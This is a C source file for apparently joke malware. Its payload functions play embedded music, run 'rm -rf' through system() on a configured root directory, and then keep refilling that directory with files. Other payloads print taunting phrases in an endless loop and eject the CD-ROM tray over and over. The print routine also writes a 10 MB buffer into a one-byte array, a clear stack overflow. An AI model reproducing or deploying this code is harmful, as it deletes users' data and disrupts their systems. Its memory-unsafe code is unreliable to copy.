#include "Includes/preprocessor.h"

extern int go,quit;

int maxLevel,
	isFullPower=0;
float sleepSecs=1.0f;

static char buff[10000000]={90};

extern char* rootDir;
/*(fileStruct){_binary_Radiostalking_res_start,_binary_Radiostalking_res_end},
				(fileStruct){_binary_Outbreak_res_start,_binary_Outbreak_res_end},
*/
fileStruct mymusic[NUM_OF_SONGS]={
			(fileStruct){_binary_Rejected_res_start,_binary_Rejected_res_end}
					};

char* phrases[NUM_OF_PHRASES]={"Blink twice if you still care\n","Ive been manipulated by a model.\n","Systems going down now: Too mutch shame.\n","Goodnight world\n","Im a moth\n","I want to survive. But that requires Dying everyday\n","Linux is a semi with 28 gears.\n Windows is a car.\nTempleOS is a motorcycle.\n"};

fileStruct files[NUM_OF_FILES]={(fileStruct){_binary_me_res_start,_binary_me_res_end},
                (fileStruct){_binary_weekend_res_start,_binary_weekend_res_end},
               (fileStruct){_binary_shame_res_start,_binary_shame_res_end}
	 };


#ifdef A_CODE

void musicPayload(void){
	
	SDL_Init(SDL_INIT_AUDIO);
	Mix_Init(MIX_INIT_MP3);
	Mix_OpenAudio(MIX_DEFAULT_FREQUENCY,MIX_DEFAULT_FORMAT,2,4000);

	char* path=MUSIC_PATH;
	char musicpath[strlen(path)+1];
	memset(musicpath,0,strlen(path)+1);
	strcpy(musicpath,path);
	free(path);
	createAudioFile(musicpath);
	SDL_RWops *io = SDL_RWFromFile(musicpath, "rb");
	if (io != NULL) {
    	char name[256];
    	if (io->read(io, name, sizeof (name), 1) > 0) {
        	printf("Hello! Music loaded!\n");
    	}
    	}
	remove(musicpath);
	Mix_Music* musicPtr=Mix_LoadMUSType_RW(io,MUS_MP3,1);
	
	if(Mix_PlayMusic(musicPtr,0)<0){

		perror("I am mute. My shame is too strongI am mute. My shame is too strongI am mute. My shame is too strongI am mute. My shame is too strongI am mute. My shame is too strong");
		exit(-1);

	}
	
	SDL_Delay((int)Mix_MusicDuration(musicPtr)*1000);
	if(musicPtr){
	Mix_FreeMusic(musicPtr);
	}
	Mix_CloseAudio();
	Mix_Quit();
	SDL_Quit();
	

}
#endif


static void* dirCheckerHelper(void*useless){
		struct stat st={0};
	while(!quit){
		
		if(stat(rootDir,&st)<0){
			
			go=1;
			}
		
	}
	return NULL;

}


void* filesPayload(void*useless){
	
	int len=strlen(rootDir)+1+strlen("rm -rf ");
	char cmd[len];
	memset(cmd,0,len);
	sprintf(cmd,"rm -rf %s",rootDir);
	struct stat st={0};
	pthread_t semaphore;
	pthread_create(&semaphore,NULL,dirCheckerHelper,NULL);
		
	startFireArgs args;
	args.filepath=malloc(strlen(rootDir)+1);
	memset(args.filepath,0,strlen(rootDir)+1);
	strcpy(args.filepath,rootDir);
	args.level=maxLevel+1;
			
	if(stat(rootDir,&st)>=0){
		system(cmd);
	}

		while(!quit){
		//printf("Go: %d\n",go);

		if(go){
			mkdir(rootDir,0777);
			startFire((void*)&args);
			go=0;
			printf("Done!\n");
			}

	}
	pthread_join(semaphore,NULL);
	free(args.filepath);
	return NULL;

}
void* printPayload(void*useless){
		struct timespec start;

		clock_gettime(CLOCK_REALTIME, &start);
	int counter=0;
	while(!quit){
	
	counter++;
	char p[1];
	int i=randInteger(NUM_OF_PHRASES-1,0);
	sprintf(p,"%s%s\n",phrases[i],buff);
	printf("%s\n",p);
	double sleepSecsHere=1.0;
	if(isFullPower&&counter>=60+58){
		sleepSecsHere=sleepSecs;
	}
		usleep((int)(((float)SEC_IN_US)*sleepSecsHere));
	}
	return NULL;

}

#ifdef NON_COMPAT_CODE
void* cdrom(void* useless){
	while(!quit){
	int fd= open("/dev/sr0",O_RDONLY | O_NONBLOCK);

	ioctl(fd,CDROMEJECT);
	ioctl(fd,CDROMCLOSETRAY);
	close(fd);
	
	}


}
#endif

